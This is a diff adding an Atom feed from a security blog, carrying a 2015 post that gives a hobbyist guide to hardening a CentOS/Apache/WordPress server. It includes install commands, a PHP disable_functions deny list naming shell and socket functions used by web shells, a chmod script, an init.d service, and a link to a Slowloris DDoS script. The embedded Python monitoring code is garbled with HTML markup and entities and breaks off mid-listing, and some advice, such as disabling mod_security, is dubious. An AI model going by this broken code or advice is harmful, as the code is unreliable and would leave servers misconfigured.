@@ -1,0 +1,977 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Config | ZeroDay Cyber Research]]></title>
+  <link href="http://z3r0d4y.com/blog/categories/config/atom.xml" rel="self"/>
+  <link href="http://z3r0d4y.com/"/>
+  <updated>2015-02-04T04:10:18-05:00</updated>
+  <id>http://z3r0d4y.com/</id>
+  <author>
+    <name><![CDATA[Ali Razmjoo]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[How to Setup Secure Website for Hackers]]></title>
+    <link href="http://z3r0d4y.com/blog/2015/02/04/how-to-setup-secure-website-for-hackers/"/>
+    <updated>2015-02-04T11:00:45-05:00</updated>
+    <id>http://z3r0d4y.com/blog/2015/02/04/how-to-setup-secure-website-for-hackers</id>
+    <content type="html"><![CDATA[<p>When security researchers and hackers want to setup a self blog the biggest stress on their brain is what to do for secure their server and site. what if someone come and naughty their servers ? what if server get DDOS attack when they don’t have access to fix up their server and they are outside on travel or maybe with their girl friend ? o.O first mistake , Hackers , Geeks , Programmers and security researches often don’t have girl friend so we skip this reason and replace it with maybe they go for business or something and they cann&rsquo;t access their server for some reason. After some years that I spent my life on information security I release that nothing cannot be secure 100% , But We shouldn&rsquo;t give it up and let others naughty our server and deface our website or maybe make a botnet zombie for DDOS Attack. In past year I decision to do something to remove this stress on my self or make it less and I start to make a mini firewall or something like Robot for secure my server because I don’t trust other firewalls. 99% of firewalls bypass easy and it’s really ridicule that big firewalls from big company mostly skip checking the packets on POST requests. So it’s first reason I decision to secure my server by my own scripts, So keep reading to know more.</p>
+
+<!-- more -->
+
+
+<p>At first We must to know , what do we have and what do we want? my first decision to secure my website is that I build my website on my own VPS and don&rsquo;t share VPS with anyone else, so Don’t use a share hosting for your site if it’s important for you and by the way this method I want to talk about cann&rsquo;t be use for share hosting and it will make you in trouble if you share your VPS with someone else. Second decision is choose a operation system and a website platform for yourself, I chosen CentOS for my Server OS and WordPress for my blogging. Notice , you can choose anything but after you read this article you must to know how edit source codes and match them with other website platform or OS. By the way I get a VPS that have a Console Access [Hardware Access + Emergency SSH or Emergency VNC] and I install a Panel [ For Example <a href="http://cpanel.net/">CPanel X (WHM/CPANEL)</a> ] and panel installer will automatically install anything  that need to be install on Server. That was first Step for lazy guys and if you like , you can install anything you need with terminal on SSH or anyway you like. Just setup your website and after That install your Wordpress [or anything you want]. Okay Here we go. Now what you need to Secure:
+<br>1- WebServer
+<br>2- Your Blogging(or maybe forum or &hellip;) Platform
+<br>3- PHP
+<br>4- Set Permissions
+<br>5- Make a Mini Robot And a mini WAF
+<br>6- Other Service if you use [For Example SSH , I will explain this in at the end of this article]</p>
+
+<p>For begining I&rsquo;ve to say i don&rsquo;t want to teach from begining of securing or config server so you most have little knowlage when you reading this article and for secure your Webserver if you using Apache [httpd] you really need to install <a href="http://blog.secaserver.com/2011/08/protect-apache-slowloris-attack/">Anti Slowloris</a> first. Maybe you hear <a href="http://ha.ckers.org/slowloris/slowloris.pl">Slowloris</a> before it&rsquo;s a <a href="http://ha.ckers.org/slowloris/slowloris.pl">DDOSER Script</a>  and easily can take down the Apache webserver. So now how to install This ?
+<br>Fallow these commands:
+<code>bash
+mkdir zeroday
+cd zeroday
+wget http://sourceforge.net/projects/mod-antiloris/files/mod_antiloris-0.4.tar.bz2/download
+tar -xvjf mod_antiloris-0.4.tar.bz2
+cd mod_antiloris-0.4
+apxs -a -i -c mod_antiloris.c
+service httpd restart
+</code></p>
+
+<p>If your Centos Doesn&rsquo;t have apxs so you need to fallow these commands:
+<code>bash
+yum install php-pear
+yum install php-devel
+yum install httpd-devel
+pecl install apc
+echo "extension=apc.so" &gt; /etc/php.d/apc.ini
+service httpd restart
+</code>
+And again if show you any error about php-devel or httpd-devel don&rsquo;t give up and install these from rpm packages From <a href="http://vault.centos.org/5.3/updates/x86_64/RPMS/">vault.centos.org</a>.<br></p>
+
+<p>The next step for config your webserver ,You need to off the webserver signature to don&rsquo;t get others much information about webserver modules.
+so find the httpd.conf and then open it and search the &ldquo;ServerSignature On&rdquo; , replace with &ldquo;ServerSignature Off&rdquo; and add &ldquo;ServerTokens Prod&rdquo; or &ldquo;ServerTokens Email&rdquo; [Webmaster or Admin Email].</p>
+
+<p>For next Step is Disable the CGI and Directory Listing and you need to Add &ldquo;Options  -Indexes -ExecCGI &hellip;&rdquo; , If you do it before you know how to add these and if not beginners can learn from this <a href="http://www.petefreitag.com/item/505.cfm">URL</a>.</p>
+
+<p>Notice: In that url I shared for beginners said about &ldquo;mod_security&rdquo; and I suggest you don&rsquo;t install or active it, sometimes it&rsquo;s not good for poor servers and in DDOS attacks it will help for make website go offline [On Crash or Use much system processing].</p>
+
+<p>And now PHP config time,  all you need is set some disable functions and turn on safe mode and disable errors to not show path and user, and other one is to disallow url opening with fopen.
+I just made a list for disable function you can use it.
+<code>php
+socket_last_error,pcntl_wexitstatus,socket_recvfrom,pcntl_wifexited,socket_getpeername,posix_mknod,base64_decode,pcntl_wtermsig,imap_list,php_uname,openlog,stream_socket_client,imap_open,socket_create,proc_get_status,posix_isatty,group,stream_copy_to_stream,posix_getrlimit,fwrite,pfsockopen,pfsockopenproc_nice,is_writable,socket_write,socket_read,posix_mkfifo,posix_initgroups,stream_get_wrappers,dl,posix_getpwnam,posix_getgrgid,stream_filter_append,posix_getgid,posix_getcwd,posix_getgroups,chmod,socket_set_block,pcntl_wstopsig,socket_writereadlink,stream_set_blocking,stream_context_create,rewinddir,proc_terminate,stream_get_filters,pcntl_signal,dlopenlog,stream_select,curl_getinfo,posix_geteuid,stream_socket_recvfrom,error_log,socket_select,shell_exec,apache_getenv,gzinflate,dir,posix_getpwuid,tmpfile,GETCWD(),stream_resolve_include_path,socket_clear_error,pcntl_wifstopped,syslog,stream_context_set_option,stream_socket_accept,getmypid,cpanel_check,stream_socket_shutdown,apache_note,purepass,posix_getsid,leak,phpinfo,stream_socket_pair,posix_setegid,socket_set_nonblock,reg_glob,escapeshellcmd,gzuncompress,pureuser,show_source,apache_get_version,posix_getlogin,posix_ctermid,posix_kill,socket_accept,posix_getppid,symlink,timearray,pcntl_waitpid,getmygid,posix_ttyname,diskfreespace,popen,stream_socket_sendto,apache_setenv,stream_context_set_params,stream_filter_register,posix_access,socket_set_option,stream_context_get_default,posix_errno,posix_times,posix_setuid,socket_get_option,ftp_check,stream_socket_enable_crypto,port_bind_bd_c,proc_open,pcntl_wifsignaled,proc_deutf,posix_seteuid,posix_uname,get_current_user,socket_create_pair,proc_nice,curl_errno,socket_sendsocket_sendto,mkdir,system,stream_get_line,posix_getpid,highlight_file,socket_create_listen,mysql_list_dbs,listen,imap_body,shell,ini_alter,posix_setpgid,socket_bind,link,getmyuid,posix_getpgid,ini_restore,posix_setsid,stream_set_write_buffer,posix_getegid,eof_ctrl_dir,getrusage,stream_set_timeout,ini_get_all,apache_get_modules,stream_socket_server,stream_filter_remove,posix_setgid,proc_close,socket_shutdown,socket_listen,stream_encoding,posix_getgrnam,stream_wrapper_unregister,stream_get_meta_data,getmicrotime,fpassthru,socket_recv,virtual,chgrp,presets_rlph,posix_getuid,stream_filter_prepend,stream_get_transports,stream_context_get_options,set_time_limit,exec,posix_getpgrp,stream_register_wrapper,stream_socket_get_name,stream_bucket_new,posix_get_last_error,gethostbyname,getcwd(),chroot,socket_close,escapeshellarg,fsockopen,passthru,stream_wrapper_register,socket_strerror,stream_get_contents,stream_wrapper_restore,pcntl_exec,socket_connect,stream_bucket_prepend,chown,posix_strerror,curl_multi_exec,pcntl_fork,apache_child_terminate
+</code>
+and  beginners can check <a href="http://www.madirish.net/199">HERE</a> for how to do things I said.</p>
+
+<p>Until now anything I said was simple and not any special things and also maybe easy to bypass, But don’t hurry up. let me explain more and then we continue. With that disable functions and php config we disabled the RCE vulnerabilities and something more that you know they appear with those functions, And now first copy this python script in your public_html and run it. It’s going to change file and folder permissions [remove write permission]. So after you setup your website and finish you must close write permission on every folder and files in public_html. On this way no one cannot upload anything on your website and if you want to upload anything you have to upload on database or if want to upload in the public_html folder you must open permission for seconds and upload your files and close it again, Now We know that uploading and file wrting begin disable on our server in easy way.</p>
+
+<pre><code class="python Perm.py https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/perm.py">import os
+#Ali Razmjoo
+for dirname, dirnames, filenames in os.walk('/home/zeroday/public_html/'): #change directory or copy file to public_html directory and set directory ('.')
+        for subdirname in dirnames:
+                f = os.path.join(dirname, subdirname)
+                f = f[2:]
+                cmd = 'chmod 555 ' + str(f) #555 Perm for Folders
+                os.system(cmd)
+        for filename in filenames:
+                f = os.path.join(dirname, filename)
+                f = f[2:]
+                cmd = 'chmod 444 ' + str(f) #444 Perm for Files
+                os.system(cmd)
+</code></pre>
+
+<p>Note: This script set 555 permission for folders and 444 for files.
+<br>Note: All scripts not coded in professional coding mode so take it easy. I wrote them so fast.</p>
+
+<p>Now it’s time for our little baby robot. What does it have to do for us? How does it work? I made a mini robot that add a service named “zeroday” in your OS [Linux base] and then open some Subprocess and start working , what’s his job ?
+<b>1- Check for DDOS attack from inside and outside
+<br>2- Check MD5 for public_html files
+<br>And now about source codes and explain. first you must create file with name “zeroday” in /etc/init.d/ zeroday is begin your service name. [work with command “service zeroday start/stop”] and here is sourcode code
+<br>Note: You can choose a different service name [&lsquo;zeroday&rsquo; or anything you like]</p>
+
+<pre><code class="bash zeroday https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/zeroday">#!/bin/bash
+#found on google
+WORK_DIR="/var/lib/foo"
+DAEMON="/usr/bin/python"
+ARGS="/root/zeroday.py"  
+PIDFILE="/var/run/foo.pid"
+USER="root" #you must run this process as root
+KILL="/root/kill.py"
+case "$1" in
+  start)
+    echo "Starting server"
+    mkdir -p "$WORK_DIR"
+    start-stop-daemon  --start --pidfile $PIDFILE \  
+        --user $USER \
+        -b --make-pidfile \
+        --chuid $USER \
+        --exec $DAEMON $ARGS
+   ;;
+  stop)
+    echo "Stopping server"
+    start-stop-daemon --stop --pidfile $PIDFILE --verbose
+    python $KILL
+    ;;
+  *)
+    echo "Usage: /etc/init.d/$USER {start|stop}"
+    exit 1
+    ;;
+esac
+exit 0
+</code></pre>
+
+<p>Explain this code:
+<br>I found this code in google and it&rsquo;s gonna help us make a service very easy on linux.
+<br>Look at this like:
+<code>bash
+ARGS="/root/zeroday.py"
+</code>
+zeroday.py is main starting script of robot.
+<code>bash
+KILL="/root/kill.py"
+</code>
+kill.py execute when we want stop robot[service].
+<br>Note: You must create these files in same directory or change directory in service bash script.
+<br>Note: As you see in line 12 , we must install &lsquo;start-stop-daemon&rsquo; so download and install it.
+<br>Daemon Download:
+<code>bash
+wget https://raw.githubusercontent.com/Ali-Razmjoo/z3r0d4y/master/daemon.zip
+unzip daemon.zip
+cd daemon
+make
+</code>
+And if you get any error, you don&rsquo;t have gcc so:
+<code>bash
+yum install gcc
+gcc start-stop-daemon.c -o start-stop-daemon
+cp start-stop-daemon /usr/sbin/
+chmod 755 /usr/sbin/start-stop-daemon
+</code>
+And daemon installed.<br>
+Now the main python file for start all subprocess together.
+source code :
+<figure class='code'><figcaption><span>zeroday.py <a href="https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/zeroday.py">https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/zeroday.py</a></p></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+<span class='line-number'>134</span>
+<span class='line-number'>135</span>
+<span class='line-number'>136</span>
+<span class='line-number'>137</span>
+<span class='line-number'>138</span>
+<span class='line-number'>139</span>
+<span class='line-number'>140</span>
+<span class='line-number'>141</span>
+<span class='line-number'>142</span>
+<span class='line-number'>143</span>
+<span class='line-number'>144</span>
+<span class='line-number'>145</span>
+<span class='line-number'>146</span>
+<span class='line-number'>147</span>
+<span class='line-number'>148</span>
+<span class='line-number'>149</span>
+<span class='line-number'>150</span>
+<span class='line-number'>151</span>
+<span class='line-number'>152</span>
+<span class='line-number'>153</span>
+<span class='line-number'>154</span>
+<span class='line-number'>155</span>
+<span class='line-number'>156</span>
+<span class='line-number'>157</span>
+<span class='line-number'>158</span>
+<span class='line-number'>159</span>
+<span class='line-number'>160</span>
+<span class='line-number'>161</span>
+<span class='line-number'>162</span>
+<span class='line-number'>163</span>
+<span class='line-number'>164</span>
+<span class='line-number'>165</span>
+<span class='line-number'>166</span>
+<span class='line-number'>167</span>
+<span class='line-number'>168</span>
+<span class='line-number'>169</span>
+<span class='line-number'>170</span>
+<span class='line-number'>171</span>
+<span class='line-number'>172</span>
+<span class='line-number'>173</span>
+<span class='line-number'>174</span>
+<span class='line-number'>175</span>
+<span class='line-number'>176</span>
+<span class='line-number'>177</span>
+<span class='line-number'>178</span>
+<span class='line-number'>179</span>
+<span class='line-number'>180</span>
+<span class='line-number'>181</span>
+<span class='line-number'>182</span>
+<span class='line-number'>183</span>
+<span class='line-number'>184</span>
+<span class='line-number'>185</span>
+<span class='line-number'>186</span>
+<span class='line-number'>187</span>
+<span class='line-number'>188</span>
+<span class='line-number'>189</span>
+<span class='line-number'>190</span>
+<span class='line-number'>191</span>
+<span class='line-number'>192</span>
+<span class='line-number'>193</span>
+<span class='line-number'>194</span>
+<span class='line-number'>195</span>
+<span class='line-number'>196</span>
+<span class='line-number'>197</span>
+<span class='line-number'>198</span>
+<span class='line-number'>199</span>
+<span class='line-number'>200</span>
+<span class='line-number'>201</span>
+<span class='line-number'>202</span>
+<span class='line-number'>203</span>
+<span class='line-number'>204</span>
+<span class='line-number'>205</span>
+<span class='line-number'>206</span>
+<span class='line-number'>207</span>
+<span class='line-number'>208</span>
+<span class='line-number'>209</span>
+<span class='line-number'>210</span>
+<span class='line-number'>211</span>
+<span class='line-number'>212</span>
+<span class='line-number'>213</span>
+<span class='line-number'>214</span>
+<span class='line-number'>215</span>
+<span class='line-number'>216</span>
+<span class='line-number'>217</span>
+<span class='line-number'>218</span>
+<span class='line-number'>219</span>
+<span class='line-number'>220</span>
+<span class='line-number'>221</span>
+<span class='line-number'>222</span>
+<span class='line-number'>223</span>
+<span class='line-number'>224</span>
+<span class='line-number'>225</span>
+<span class='line-number'>226</span>
+<span class='line-number'>227</span>
+<span class='line-number'>228</span>
+<span class='line-number'>229</span>
+<span class='line-number'>230</span>
+<span class='line-number'>231</span>
+<span class='line-number'>232</span>
+<span class='line-number'>233</span>
+<span class='line-number'>234</span>
+<span class='line-number'>235</span>
+<span class='line-number'>236</span>
+<span class='line-number'>237</span>
+<span class='line-number'>238</span>
+<span class='line-number'>239</span>
+<span class='line-number'>240</span>
+<span class='line-number'>241</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Ali</span> <span class="n">Razmjoo</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">hashlib</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">signal</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">multiprocessing</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">sys</span><span class="o">,</span><span class="nn">httplib</span><span class="o">,</span><span class="nn">pickle</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">re</span><span class="o">,</span><span class="nn">urllib2</span> <span class="c">#import modules</span>
+</span><span class='line'><span class="n">stop_event</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>  <span class="c">#start multiprocessing</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">stop</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">stop_event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
+</span><span class='line'><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="n">stop</span><span class="p">)</span>
+</span><span class='line'><span class="k">if</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">name</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">main</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;&amp;</span><span class="n">rsquo</span><span class="p">;:</span> <span class="c">#start software</span>
+</span><span class='line'>    <span class="k">while</span> <span class="ow">not</span> <span class="n">stop_event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span> <span class="c">#while bash script not stop &amp;hellip;.</span>
+</span><span class='line'>        <span class="n">subpro_in</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">python</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="ow">in</span><span class="o">.</span><span class="n">py</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;],</span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">pid_in</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">subpro_in</span><span class="o">.</span><span class="n">pid</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">subpro_out</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">python</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">out</span><span class="o">.</span><span class="n">py</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;],</span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">pid_out</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">subpro_out</span><span class="o">.</span><span class="n">pid</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">subpro_24</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">python</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="mi">24</span><span class="n">ban</span><span class="o">.</span><span class="n">py</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;],</span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">pid_24</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">subpro_24</span><span class="o">.</span><span class="n">pid</span><span class="p">)</span>   <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
+</span><span class='line'>        <span class="n">subpro_md5</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">python</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">md5</span><span class="o">.</span><span class="n">py</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;],</span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">pid_md5</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">subpro_md5</span><span class="o">.</span><span class="n">pid</span><span class="p">)</span>     <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
+</span><span class='line'>        <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>            <span class="n">loop</span> <span class="o">=</span> <span class="mi">1</span>          <span class="c">#keep this process active</span>
+</span><span class='line'>            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
+</span><span class='line'><span class="o">&lt;</span><span class="n">code</span><span class="o">&gt;</span>
+</span><span class='line'><span class="n">Note</span><span class="p">:</span> <span class="n">Copy</span> <span class="n">it</span> <span class="ow">in</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span> <span class="n">directory</span><span class="p">,</span> <span class="n">If</span> <span class="n">you</span> <span class="n">want</span> <span class="n">change</span> <span class="n">directory</span><span class="p">,</span> <span class="n">Don</span><span class="s">&#39;t forget to change it in source codes too.</span>
+</span><span class='line'><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">br</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="ow">and</span> <span class="n">other</span> <span class="n">files</span> <span class="n">you</span> <span class="n">need</span> <span class="n">to</span> <span class="n">have</span> <span class="ow">in</span> <span class="n">root</span> <span class="n">directory</span><span class="p">:</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;</span><span class="n">python</span> <span class="mi">24</span><span class="n">ban</span><span class="o">.</span><span class="n">py</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/24ban.py&quot;</span><span class="o">&gt;</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Ali</span><span class="o">-</span><span class="n">Razmjoo</span><span class="o">/</span><span class="n">z3r0d4y</span><span class="o">/</span><span class="n">blob</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="mi">24</span><span class="n">ban</span><span class="o">.</span><span class="n">py</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">hashlib</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">signal</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">multiprocessing</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">sys</span><span class="o">,</span><span class="nn">httplib</span><span class="o">,</span><span class="nn">pickle</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">re</span><span class="o">,</span><span class="nn">urllib2</span> <span class="c">#import modules</span>
+</span><span class='line'><span class="n">stop_event</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
+</span><span class='line'><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">120</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">netstat</span> <span class="o">-</span><span class="n">ntu</span> <span class="o">|</span> <span class="n">awk</span> \<span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;{</span><span class="k">print</span> <span class="err">$</span><span class="mi">5</span><span class="p">}</span>\<span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span> <span class="o">|</span> <span class="n">cut</span> <span class="o">-</span><span class="n">d</span><span class="p">:</span> <span class="o">-</span><span class="n">f1</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">|</span> <span class="n">uniq</span> <span class="o">-</span><span class="n">c</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">-</span><span class="n">n</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">IPz</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
